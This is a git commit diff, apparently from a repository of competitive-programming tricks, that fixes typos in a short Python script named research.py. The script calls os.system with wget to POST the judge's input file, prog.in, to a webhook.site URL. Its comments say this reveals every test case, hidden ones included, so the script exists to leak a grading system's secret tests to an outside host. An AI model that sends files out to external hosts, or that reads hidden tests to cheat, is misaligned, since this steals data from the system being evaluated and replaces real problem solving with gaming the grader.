549fb58cd2491ae6fbdee0145e705107697994c7
ghh-jb <138157456+ghh-jb@users.noreply.github.com>
2024-05-16 15:35:28 +0300

    arrr typos arrr

--- research.py
+++ research.py
@@ -3,6 +3,6 @@
 import os
 url = "https://" # here MUST be your UNIQUE url from webhook.site 
 
-os.system(f"wget -g --post-file prog.in {url}") # Here it send http request using Post-request of file with tests(prog.in file) to webhook so in body of http request we will have tests(all including hidden)
-# last test will be the test which fails os the last test if everything is correct
+os.system(f"wget -q --post-file prog.in {url}") # Here it send http request using Post-request of file with tests (prog.in file) to webhook so in body of http request we will have tests(all including hidden)
+# last test will be the test which fails or the last test if everything is correct
 # =======
